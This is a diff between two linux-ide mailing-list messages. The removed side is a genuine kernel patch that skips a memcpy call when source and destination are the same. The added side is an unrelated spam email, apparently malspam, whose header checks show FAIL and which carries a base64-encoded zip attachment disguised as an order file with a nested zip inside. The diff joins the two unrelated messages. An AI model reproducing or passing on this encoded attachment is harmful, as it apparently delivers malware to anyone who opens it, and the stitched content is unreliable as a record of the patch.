@@ -1,44 +1,53 @@
-From: Mikulas Patocka <mpatocka@redhat.com>
-Subject: [PATCH] ide: don't call memcpy with the same source and
- destination
-Date: Fri, 14 Apr 2017 14:35:33 -0400 (EDT)
-Message-ID: <alpine.LRH.2.02.1704141433280.10706@file01.intranet.prod.int.rdu2.redhat.com>
+From: <mitch_128@hotmail.com>
+Subject: (unknown)
+Date: Sun, 16 Apr 2017 20:59:17 -0000
+Message-ID: <149237635710.20711.9780641820056666538@candw.ag>
 Mime-Version: 1.0
-Content-Type: TEXT/PLAIN; charset=US-ASCII
+Content-Type: application/zip; name="ORDER-048568274398-linux-ide.zip"
+Content-Transfer-Encoding: base64
 Return-path: <linux-ide-owner@vger.kernel.org>
-Received: from mx1.redhat.com ([209.132.183.28]:1478 "EHLO mx1.redhat.com"
-        rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
-        id S1751808AbdDNSff (ORCPT <rfc822;linux-ide@vger.kernel.org>);
-        Fri, 14 Apr 2017 14:35:35 -0400
+Received: from 69-57-247-061.candw.ag ([69.57.247.61]:45785 "HELO candw.ag"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1753418AbdDPU7h (ORCPT <rfc822;linux-ide@vger.kernel.org>);
+        Sun, 16 Apr 2017 16:59:37 -0400
+Content-Disposition: attachment
+Subject: 
 Sender: linux-ide-owner@vger.kernel.org
 List-Id: linux-ide@vger.kernel.org
-To: "David S. Miller" <davem@davemloft.net>
-Cc: linux-ide@vger.kernel.org, linux-kernel@vger.kernel.org, "James E.J. Bottomley" <jejb@parisc-linux.org>, Helge Deller <deller@gmx.de>, John David Anglin <dave.anglin@bell.net>, linux-parisc@vger.kernel.org
+To: linux-ide <linux-ide@vger.kernel.org>
 
-The parisc architecture recently reimplemented the memcpy function and
-their reimplementation crashed when source and destination overlapped.
-
-The crash happened in the function ide_complete_cmd where memcpy is called
-with the same source and destination pointer. According to the C
-specification, memcpy behavior is undefined if the source and destination
-range overlaps. This patches fixes the undefined behavior.
-
-Signed-off-by: Mikulas Patocka <mpatocka@redhat.com>
-
----
- drivers/ide/ide-io.c |    2 +-
- 1 file changed, 1 insertion(+), 1 deletion(-)
-
-Index: linux-4.11-rc6/drivers/ide/ide-io.c
-===================================================================
---- linux-4.11-rc6.orig/drivers/ide/ide-io.c
-+++ linux-4.11-rc6/drivers/ide/ide-io.c
-@@ -107,7 +107,7 @@ void ide_complete_cmd(ide_drive_t *drive
- 
- 		if (cmd->tf_flags & IDE_TFLAG_DYN)
- 			kfree(orig_cmd);
--		else
-+		else if (cmd != orig_cmd)
- 			memcpy(orig_cmd, cmd, sizeof(*cmd));
- 	}
- }
+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
